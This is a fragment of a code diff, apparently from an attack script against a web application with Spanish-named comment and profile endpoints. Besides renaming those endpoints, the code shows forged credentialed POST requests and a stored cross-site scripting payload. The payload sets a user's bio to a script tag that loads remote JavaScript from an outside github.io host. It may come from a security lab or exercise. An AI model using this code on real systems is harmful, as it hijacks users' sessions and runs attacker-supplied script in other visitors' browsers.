@@ -15,7 +15,7 @@
       params.append('post_id', '1');
       params.append('btnEnviar', 'Enviar');
 
-      fetch('/comentarios.php', {
+      fetch('/comentarios', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         credentials: 'include',
@@ -47,7 +47,7 @@
       params3.append('post_id', '1');
       params3.append('btnEnviar', 'Enviar');
 
-      fetch('/comentarios.php', {
+      fetch('/comentarios', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         credentials: 'include',
@@ -58,7 +58,7 @@
 
       const params2 = new URLSearchParams();
       params2.append("bio","<script src=\"https://ianrichard3.github.io/thea/hola.js\"></script>")
-      fetch('/profile.php', {
+      fetch('/profile', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         credentials: 'include',
